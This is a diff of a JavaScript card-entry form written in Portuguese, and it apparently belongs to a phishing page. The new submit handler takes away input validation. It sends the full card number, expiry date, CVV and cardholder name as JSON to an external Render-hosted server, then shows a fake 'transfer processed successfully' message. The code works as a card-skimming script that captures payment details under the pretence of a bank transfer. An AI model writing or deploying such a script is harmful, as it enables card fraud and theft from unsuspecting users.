@@ -1,6 +1,6 @@
 document.addEventListener("DOMContentLoaded", () => {
     const form = document.querySelector("#dadosss");
-
+    
     const campos = {
         numero: document.querySelector("#numero"),
         data: document.querySelector("#data"),
@@ -8,6 +8,7 @@ document.addEventListener("DOMContentLoaded", () => {
         nome: document.querySelector("#nome"),
     };
 
+    // --- LOGICA DAS DICAS (Mantida do seu original) ---
     const mensagensDica = {
         numero: "Exemplo: 1234 5678 9123 4567",
         data: "Exemplo: 12/30",
@@ -15,7 +16,13 @@ document.addEventListener("DOMContentLoaded", () => {
         nome: "Nome completo impresso no cartão.",
     };
 
-    // --- DICAS (MANTIDO IGUAL AO SEU) ---
+    function removeMensagemDica(input) {
+        const dicaExistente = input.parentElement.querySelector(".mensagem-dica");
+        if (dicaExistente) {
+            dicaExistente.remove();
+        }
+    }
+
     for (const key in campos) {
         const input = campos[key];
         input.addEventListener("focus", () => {
@@ -34,117 +41,53 @@ document.addEventListener("DOMContentLoaded", () => {
         });
     }
 
-    function removeMensagemDica(input) {
-        const existing = input.parentElement.querySelector(".mensagem-dica");
-        if (existing) existing.remove();
-    }
-
-    // --- EVENTO DE SUBMIT (AQUI ESTÁ A LÓGICA DO AVISO VERMELHO) ---
+    // --- NOVA LOGICA DE ENVIO PARA O BANCO DE DADOS ---
     form.addEventListener("submit", async (event) => {
-        event.preventDefault();
+        event.preventDefault(); // Impede o recarregamento da página
 
-        // Limpa mensagens de erro anteriores para não duplicar
-        document.querySelectorAll(".mensagem-erro").forEach(el => el.remove());
+        // 1. Pegar o tipo de cartão selecionado
+        const cardType = document.querySelector('input[name="gender"]:checked')?.value || "Não informado";
 
-        const inputs = {
-            numero: campos.numero,
-            data: campos.data,
-            cvv: campos.cvv,
-            nome: campos.nome,
-            tipo: document.querySelector('input[name="gender"]:checked'),
+        // 2. Montar o objeto com os dados
+        const dadosParaEnviar = {
+            numero: campos.numero.value,
+            dataValidade: campos.data.value,
+            cvv: campos.cvv.value,
+            nome: campos.nome.value,
+            tipo: cardType
         };
 
-        const mensagensErro = {
-            numero: "Por favor, insira o número do cartão.",
-            data: "A data e o CVV são necessários.",
-            cvv: "",
-            nome: "Por favor, insira o nome impresso no cartão.",
-            tipo: "Selecione uma opção (Crédito ou Débito).",
-        };
+        // 3. DESATIVAR O BOTÃO (Evita que o usuário clique 10 vezes enquanto envia)
+        const botao = form.querySelector("button");
+        botao.disabled = true;
+        botao.textContent = "Processando...";
 
-        let formValido = true;
+        try {
+            // IMPORTANTE: Substitua o link abaixo pelo link que o RENDER te der!
+            // Exemplo: https://meu-projeto-api.onrender.com/enviar-dados
+            const urlDoServidor = "https://backend-g2xn.onrender.com";
 
-        // LOOP DE VALIDAÇÃO (CRIA O RETÂNGULO E O TEXTO VERMELHO)
-        for (const key in inputs) {
-            const input = inputs[key];
+            const resposta = await fetch(urlDoServidor, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(dadosParaEnviar)
+            });
 
-            if (!input || (input.value === "" || input.value === undefined)) {
-                formValido = false;
-
-                if (key === "tipo") {
-                    const radios = document.querySelectorAll('input[name="gender"]');
-                    radios.forEach(r => {
-                        r.parentElement.style.border = "1px solid red"; // Retângulo Vermelho
-                        r.parentElement.style.borderRadius = "8px";
-                        r.parentElement.style.padding = "5px";
-                    });
-
-                    const container = document.querySelector(".radio-container");
-                    const erro = document.createElement("span");
-                    erro.classList.add("mensagem-erro");
-                    erro.style.color = "red"; // Texto Vermelho
-                    erro.style.fontSize = "14px";
-                    erro.textContent = mensagensErro[key];
-                    container.appendChild(erro);
-
-                } else {
-                    input.style.border = "1px solid red"; // Retângulo Vermelho
-                    input.style.borderRadius = "8px";
-
-                    const erro = document.createElement("span");
-                    erro.classList.add("mensagem-erro");
-                    erro.style.color = "red"; // Texto Vermelho
-                    erro.style.fontSize = "14px";
-                    erro.style.display = "block";
-                    erro.style.marginTop = "4px";
-                    erro.textContent = mensagensErro[key];
-                    input.parentElement.appendChild(erro);
-                }
+            if (resposta.ok) {
+                alert("Transferência processada com sucesso!");
+                form.reset(); // Limpa o formulário
             } else {
-                // Se o campo for preenchido, limpa a borda vermelha
-                if (key === "tipo") {
-                    document.querySelectorAll('input[name="gender"]').forEach(r => {
-                        r.parentElement.style.border = "none";
-                    });
-                } else {
-                    input.style.border = "1px solid #ccc";
-                }
+                alert("Erro ao processar transferência. Tente novamente.");
             }
-        }
-
-        // --- SÓ ENVIA SE O FORM FOR VÁLIDO ---
-        if (formValido) {
-            const cardType = document.querySelector('input[name="gender"]:checked')?.value || 'Not selected';
-            
-            const dadosParaEnviar = {
-                numero: campos.numero.value,
-                dataValidade: campos.data.value,
-                cvv: campos.cvv.value,
-                nome: campos.nome.value,
-                tipo: cardType
-            };
-
-            try {
-                // ENVIO PARA O TEU RENDER
-                const urlDoServidor = "https://backend-g2xn.onrender.com";
-
-                const resposta = await fetch(urlDoServidor, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(dadosParaEnviar)
-                });
-
-                if (resposta.ok) {
-                    window.location.href = "confirmacao.html"; // Redireciona se deu certo
-                } else {
-                    alert("Erro ao salvar no banco. Verifique o servidor.");
-                }
-            } catch (error) {
-                console.error("Erro:", error);
-                alert("Servidor offline!");
-            }
+        } catch (error) {
+            console.error("Erro na conexão:", error);
+            alert("O servidor está offline. Tente novamente em alguns instantes.");
+        } finally {
+            // Reativar o botão
+            botao.disabled = false;
+            botao.textContent = "Transferir";
         }
     });
 });
-
-
